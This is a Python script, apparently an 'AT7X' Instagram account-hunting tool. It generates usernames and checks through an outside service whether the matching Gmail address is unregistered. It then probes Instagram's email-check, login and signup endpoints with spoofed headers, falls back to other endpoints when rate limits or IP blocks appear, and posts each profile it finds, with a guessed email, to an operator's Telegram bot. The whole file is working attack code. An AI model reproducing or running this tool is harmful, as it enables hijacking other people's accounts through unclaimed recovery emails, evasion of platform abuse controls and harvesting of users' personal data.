import os
import sys
import socket
import requests,random
from random import randrange, choice
from time import sleep as wait
from termcolor import colored
from pyfiglet import Figlet
import user_agent
from user_agent import generate_user_agent
from Topython import Instagram
import concurrent.futures
import threading
from uuid import uuid4
from time import time
from hashlib import md5
R,X, Y, G = '\033[1;31;40m', '\033[1;33;40m', '\033[1;32;40m', "\033[1;97;40m"
ht = 0
bi = 0
bg = 0

lock = threading.Lock()
token=input('TOKEN: ')
idd=input('ID: ')
def info(user):
    global token,idd
    reset = Instagram.Rests(user)
    info = Instagram.information(user)
    name, username, followers, following, date, Id, post, bio = info['name'], info['username'], info['followers'], info['following'], info['date'], info['id'], info['post'], info['bio']
    send = ("Name : {}\nUsername : {}\nEmail : {}@gmail.com\nFollowers : {}\nFollowing : {}\nDate : {}\nid : {}\nPosts : {}\nBio : {}\nRests {}\nBY : {}".format(name, username, username, followers, following, date, Id, post, bio, reset, "A-T-7-X. -- @Hackeralokid"))
    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={idd}&text="+str(send))
    print(Y + send)
def insta(mail):
    global ht, bi, bg
    url = "https://www.instagram.com/api/v1/web/accounts/check_email/"
    ua=generate_user_agent('android')
    csrftoken = md5(str(time()).encode()).hexdigest()
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': ua,
        'x-csrftoken': csrftoken
    }
    data = {
        'email': mail,
    }    
    res = requests.post(url, headers=headers, data=data).text
    if 'taken' in res:
        with lock:
            ht += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
        info(mail.split("@")[0])
    elif "few" in res or "Try Again Later"  in res or "feedback_mess"  in res:insta2(mail)
    else:
        with lock:
            bi += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
    get_way()
def insta2(mail):
    global ht, bi, bg
    uid = uuid4()
    agents =["Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)"]
    agent = random.choice(agents)
    url = "https://i.instagram.com/api/v1/accounts/login/"
    headers = {
    "Content-Length": "339",
    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "Host": "i.instagram.com",
    "Connection": "Keep-Alive",
    "User-Agent": agent,
    "Cookie": f"mid={uid}",
    "Cookie2": "$Version\u003d1",
    "Accept-Language": "ar-EG",
    "X-IG-Connection-Type": "MOBILE(LTE)",
    "X-IG-Capabilities": "AQ\u003d\u003d",
    "Accept-Encoding": "gzip"
		}
    data = {'uuid':uid,  'password':'@At777xxx',
              'username':mail,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
    req = requests.post(url,headers=headers,data=data).text
    if "كلمة السر التي أدخلتها غير صحيحة" in req:
        with lock:
            ht += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
        info(mail.split("@")[0])
    elif "few" in req or "Try Again Later"  in req or "feedback_mess"  in req or 'ip_block' in req:insta3(mail)
    else:
        with lock:
            bi += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
    get_way()
def insta3(mail):
    global ht, bi, bg
    url = 'https://www.instagram.com/accounts/web_create_ajax/attempt/'
    headers = {'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7',
                'content-length': '61',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'ig_cb=2; ig_did=BB52B198-B05A-424E-BA07-B15F3D4C3893; mid=YAlcaQALAAHzmX6nvD8dWMRVYFCO; shbid=15012; rur=PRN; shbts=1612894029.7666144; csrftoken=CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/emailsignup/',
                'sec-ch-ua': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': str(generate_user_agent()),
                'x-csrftoken': 'CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR0Plwj5om112fwzrrYnMNjMLPnyWfFFq1tG7MCcMv5_vN9M',
                'x-instagram-ajax': '72bda6b1d047',
                'x-requested-with': 'XMLHttpRequest'} 
    data = {'email' : str(mail),
                'username': str(mail),
                'first_name': 'ATX',
                'opt_into_one_tap': 'false'}
    req = requests.post(url, headers=headers, data=data).text
    if "Another account is using the same email." in req:
        with lock:
            ht += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
        info(mail.split("@")[0])
    elif "few" in req or "Try Again Later"  in req or "feedback_mess"  in req or 'ip_block' in req:insta4(mail)
    else:
        with lock:
            bi += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
    get_way()
def insta4(mail):
    global ht, bi, bg
    url = "https://i.instagram.com/api/v1/accounts/create/"
    ua=generate_user_agent('android')
    csrftoken = md5(str(time()).encode()).hexdigest()
    uid = uuid4()
    headers = {
        'User-Agent': 'Instagram 27.0.0.7.97 Android',
        'X-IG-App-Locale': 'en_US',
        'X-IG-Device-Locale': 'en_US',
        'X-IG-Mapped-Locale': 'en_US',
        'X-Pigeon-Session-Id': 'UFS-1057e2bd-27b1-48bb-85ec-1a4445a900fe-0',
        'X-Pigeon-Rawclienttime': '1628631483.793',
        'X-IG-Bandwidth-Speed-KBPS': '1034.000',
        'X-IG-Bandwidth-TotalBytes-B': '88996',
        'X-IG-Bandwidth-TotalTime-MS': '86',
        'X-IG-App-Startup-Country': 'IQ',
        'X-Bloks-Version-Id': '927f06374b80864ae6a0b04757048065714dc50ff15d2b8b3de8d0b6de961649',
        'Priority': 'u=3',
        'Accept-Language': 'en-US',
        'X-MID': 'YRLrDQABAAFdQNvSkh4QXOGpBwcn',
        'IG-INTENDED-USER-ID': '0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True',
        'X-CSRFToken': '0',
        'X-Instagram-AJAX': '8895c2bab672',
        'X-IG-App-ID': '936619743392459',
        'X-IG-WWW-Claim': 'hmac.AR0dvuggyYK2EM7-EyslQF8PKoTWn-UINP-p7ZLcVgQYAGD7',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': 'mid={}; csrftoken=0'.format('')
    }
    data = {
        'password': 'AT77XX@#',
        'device_id': uid,
        'guid': uid,
        'email': mail,
        'username': mail,
    }
    res = requests.post(url, headers=headers, data=data).text
    if 'taken' in res:
        with lock:
            ht += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
        info(mail.split("@")[0])
    elif "few" in res or "Try Again Later"  in res or "feedback_mess"  in res:insta5(mail)
    else:
        with lock:
            bi += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
    get_way()
def insta5(mail):
    global ht, bi, bg
    response = requests.get(f"https://at7x-insta-v2-proxies.onrender.com/AT7X-INSTAGRAM-CHECKER/?email={mail}")
    if "taken" in response.text:
        with lock:
            ht += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
        info(mail.split("@")[0])
    else:
        with lock:
            bi += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()
    get_way()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def gmail(mail):
    global bg, ht, bi
    url = 'https://at7x-gmail-v3.onrender.com/AT7X/gmail/V3'
    data = {"email": mail}
    response = requests.post(url, json=data, headers={'Content-Type': 'application/json'})
    if "success" in response.text:
        threading.Thread(target=insta, args=(mail,)).start()
    else:
        with lock:
            bg += 1
        sys.stdout.write(f"\r  {G}HIT : {Y}{ht} {G}  , BAD INSTA : {X}{bi}  {G}, Bad MAIL : {R}{bg} \r")
        sys.stdout.flush()

def welogo():
    sys.stdout.write(colored('       \r                       W', "grey", attrs=["bold"]))
    sys.stdout.flush()
    wait(0.2)
    sys.stdout.write(colored('       \r                       WE', "grey", attrs=["bold"]))
    sys.stdout.flush()
    wait(0.2)
    sys.stdout.write(colored('       \r                       WEL', "grey", attrs=["bold"]))
    sys.stdout.flush()
    wait(0.2)
    sys.stdout.write(colored('       \r                       WELC', "grey", attrs=["bold"]))
    sys.stdout.flush()
    wait(0.2)
    sys.stdout.write(colored('       \r                       WELCO', "grey", attrs=["bold"]))
    sys.stdout.flush()
    wait(0.2)
    sys.stdout.write(colored('       \r                       WELCOM', "grey", attrs=["bold"]))
    sys.stdout.flush()
    wait(0.2)
    sys.stdout.write(colored('       \r                       WELCOME', "grey", attrs=["bold"]))
    sys.stdout.flush()
    wait(0.2)
    sys.stdout.write(colored('       \r                       WELCOME! []', "grey", attrs=["bold"]))
    sys.stdout.flush()
    wait(0.2)
    sys.stdout.write(colored(f'       \r                       WELCOME! [{get_ip()}]\n\n', "grey", attrs=["bold"]))
    sys.stdout.flush()
    wait(2.2)

def mylogo():
    f = Figlet(font='3d_diagonal')
    text = (f.renderText(' AT7X'))
    print(colored(text, 'magenta'))
    wait(2)
    print(colored("Channel : https://t.me/HackeralokRenew", 'magenta'))
    wait(5)

welogo()
mylogo()
clear()

def get_way():
    try:
        Generate = Instagram.GenUsers()
        if Generate is not None:
            if '.' in Generate:pass
            else:
            	gmail(Generate + "@gmail.com")
    except Exception as e:
        
        print(e)
        pass
def main():
    while True:
        with concurrent.futures.ThreadPoolExecutor(max_workers=7) as executor:
            futures = [executor.submit(get_way) for _ in range(7)]
            concurrent.futures.wait(futures)

if __name__ == "__main__":
    main()